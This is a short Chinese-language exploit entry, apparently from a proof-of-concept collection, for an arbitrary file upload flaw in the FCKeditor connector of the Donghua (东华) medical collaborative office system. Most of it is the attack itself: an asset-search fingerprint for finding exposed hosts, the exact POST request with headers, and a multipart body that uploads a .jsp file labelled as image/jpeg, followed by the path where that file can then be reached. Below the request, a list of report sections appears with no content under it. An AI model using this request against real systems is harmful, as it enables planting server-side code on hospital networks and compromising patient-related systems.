# 东华医疗协同办公系统connector接口处存在任意文件上传漏洞

- **系统**：东华医疗协同办公系统connector接口处　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="/skin/charmBlue/css/dialog.css"`
- **请求**：`POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI…`　`Content-Length: 292`

**请求体 / payload**
```
------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="NewFile"; filename="stc.jsp"
Content-Type: image/jpeg
123good
------WebKitFormBoundaryt1qdEWTI01cj5BLV
Content-Disposition: form-data; name="Submit"
upload
------WebKitFormBoundaryt1qdEWTI01cj5BLV--

上传文件位置
/common/FCKeditor/UserFiles/stc.jsp
```

**其他**
- 东华医疗协同办公系统 connector接口处存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 东华医疗协同办公系统